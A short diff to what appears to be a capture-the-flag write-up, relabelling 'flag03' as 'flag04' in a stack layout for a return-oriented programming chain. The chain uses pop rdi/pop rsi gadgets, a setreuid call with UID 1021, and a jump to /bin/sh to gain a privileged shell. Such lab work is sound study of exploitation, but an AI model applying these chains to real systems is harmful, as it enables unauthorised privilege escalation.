@@ -244,9 +244,9 @@ The msg buffer will contain:
 STACK ADDR     | CONTENT
 0x7fffffffebc0 | [addr of saved rbp to override] 0x7fffffffebb0
 0x7fffffffebc8 | [ret_addr: pop rdi gadget] 0x7ffff7d0f84b
-0x7fffffffebd0 | [arg1: UID of flag03] 1021
+0x7fffffffebd0 | [arg1: UID of flag04] 1021
 0x7fffffffebd8 | [ret_addr: pop rsi gadget] 0x7ffff7d10b3d
-0x7fffffffebe0 | [arg1: UID of flag03] 1021
+0x7fffffffebe0 | [arg1: UID of flag04] 1021
 0x7fffffffebe8 | [ret_addr: setreuid] 0x7ffff7d27330
 0x7fffffffebf0 | [ret_addr: pop rdi gadget] 0x7ffff7d0f84b
 0x7fffffffebf8 | [arg1: addr of /bin/sh] 0x7ffff7dcc42f
